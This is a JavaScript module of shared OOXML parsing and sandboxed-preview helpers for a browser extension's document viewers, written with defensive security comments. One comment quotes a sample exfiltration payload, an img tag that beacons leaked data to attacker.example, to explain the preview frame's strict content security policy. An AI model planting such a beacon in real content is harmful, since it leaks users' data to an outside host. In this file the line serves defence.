// Shared OOXML plumbing for the docx / xlsx / pptx viewers.
//
// Why hand-rolled instead of `mammoth` + `exceljs`: both of those browser
// bundles contain `new Function(` (7 and 1 occurrences respectively, measured
// on mammoth 1.12.2 and exceljs 4.4.0), which Manifest V3's content security
// policy refuses — and it refuses SILENTLY enough that the failure would show
// up as a broken preview in the field rather than at build time. Dropping them
// also removes ~1.5 MB from the packaged extension.
//
// What replaces them is small because an OOXML file is a ZIP of XML and the
// browser already has both halves of that problem covered: `fflate` (vendored,
// 89 KB, zero eval/new Function) unzips, and the panel's own `DOMParser` reads
// the XML. The extractors here reconstruct STRUCTURE — headings, paragraphs,
// runs, tables, lists, cells, slides — not layout. That is the same fidelity
// class mammoth targets, and it is the fidelity the two tabs actually need.

import { unzipSync, strFromU8 } from "../../vendor/fflate.esm.js";

/**
 * Unzip an OOXML container.
 * @returns {Record<string, Uint8Array>}
 */
export function openContainer(bytes) {
  return unzipSync(bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes));
}

/** One entry of the container, as text. Returns null when absent. */
export function entryText(entries, name) {
  const found = entries[name];
  return found ? strFromU8(found) : null;
}

/** Entry names matching a pattern, in natural (numeric-aware) order. */
export function entryNames(entries, pattern) {
  return Object.keys(entries)
    .filter((name) => pattern.test(name))
    .sort((a, b) => naturalCompare(a, b));
}

/**
 * Parse an OOXML part.
 *
 * Parsed as "application/xml", never as HTML: an XML parser builds a tree
 * without executing anything, and the tree is only ever read through
 * textContent and attributes here. No part of a document's content is turned
 * into markup by this module.
 */
export function parseXml(text) {
  const doc = new DOMParser().parseFromString(text, "application/xml");
  if (doc.getElementsByTagName("parsererror").length) throw new Error("tệp OOXML hỏng: XML không hợp lệ");
  return doc;
}

/**
 * Children of `node` whose LOCAL name matches, ignoring the namespace prefix.
 *
 * OOXML parts use prefixes (`w:`, `a:`, `p:`) that a strict XML DOM keeps, and
 * `getElementsByTagName` with a prefix is brittle across producers that choose
 * different prefixes for the same namespace. Matching on localName is what
 * makes these extractors work on a file Word wrote as well as on one this
 * project generated.
 */
export function childrenNamed(node, localName) {
  const out = [];
  for (const child of node.children || []) {
    if (child.localName === localName) out.push(child);
  }
  return out;
}

/** All descendants with this local name, in document order. */
export function descendantsNamed(root, localName) {
  const out = [];
  const walk = (node) => {
    for (const child of node.children || []) {
      if (child.localName === localName) out.push(child);
      walk(child);
    }
  };
  walk(root);
  return out;
}

/** An attribute by local name, ignoring its namespace prefix. */
export function attr(node, localName) {
  for (const a of node.attributes || []) {
    if (a.localName === localName) return a.value;
  }
  return null;
}

/** "slide10.xml" sorts after "slide9.xml", which a plain string sort gets wrong. */
export function naturalCompare(a, b) {
  const ax = String(a).match(/(\d+|\D+)/g) || [];
  const bx = String(b).match(/(\d+|\D+)/g) || [];
  for (let i = 0; i < Math.max(ax.length, bx.length); i += 1) {
    const an = ax[i];
    const bn = bx[i];
    if (an === undefined) return -1;
    if (bn === undefined) return 1;
    const bothNumeric = /^\d+$/.test(an) && /^\d+$/.test(bn);
    if (bothNumeric) {
      if (Number(an) !== Number(bn)) return Number(an) - Number(bn);
    } else if (an !== bn) {
      return an < bn ? -1 : 1;
    }
  }
  return 0;
}

/** Escape text destined for an HTML string. Content is DATA, always. */
export function escapeHtml(s) {
  return String(s ?? "").replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
}

/**
 * Wrap a body fragment in a complete, styled document for the sandboxed
 * preview frame.
 *
 * The frame gets no script permission and no same-origin access, so this
 * document is inert by construction; the styling exists only so a Word or
 * Excel preview reads like a document instead of like unstyled markup.
 */
/**
 * The preview frame's own content security policy.
 *
 * The iframe's `sandbox` attribute stops scripts; it does NOT stop the network.
 * Without this, a document carrying `<img src="https://attacker.example/?leak=…">`
 * would beacon the moment the operator previewed it — and document content can
 * originate from page content a model quoted, which is exactly the injection
 * path this project's threat model names. `default-src 'none'` means no
 * request of any kind leaves the frame; inline styles are allowed because this
 * wrapper's own stylesheet is inline, and images only as `data:`, which is
 * bytes already inside the document rather than a fetch.
 */
const PREVIEW_CSP =
  `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:">`;

export function previewDocument(bodyHtml, { dark = false } = {}) {
  const fg = dark ? "#e8e8ea" : "#1a1a1c";
  const bg = dark ? "#151517" : "#ffffff";
  const line = dark ? "#3a3a40" : "#d5d5da";
  const soft = dark ? "#1f1f23" : "#f4f4f6";
  return `<!doctype html><html><head><meta charset="utf-8">${PREVIEW_CSP}<style>
    body{font:14px/1.65 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;color:${fg};background:${bg};margin:0;padding:16px}
    h1,h2,h3,h4,h5,h6{line-height:1.25;margin:1.2em 0 .5em}
    h1{font-size:1.6em}h2{font-size:1.35em}h3{font-size:1.15em}
    p{margin:0 0 .8em}
    table{border-collapse:collapse;margin:1em 0;width:100%}
    th,td{border:1px solid ${line};padding:.4em .55em;text-align:left;vertical-align:top}
    th{background:${soft};font-weight:600}
    pre{background:${soft};padding:.7em;border-radius:6px;overflow:auto}
    code{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:.92em}
    hr{border:0;border-top:1px solid ${line};margin:1.4em 0}
    ul,ol{margin:0 0 .8em 1.2em;padding:0}
    .sheet-name{font-weight:600;margin:1.4em 0 .4em;color:${fg}}
    .slide{border:1px solid ${line};border-radius:8px;padding:12px 14px;margin:0 0 12px}
    .slide-title{font-weight:600;font-size:1.1em;margin:0 0 .5em}
  </style></head><body>${bodyHtml}</body></html>`;
}
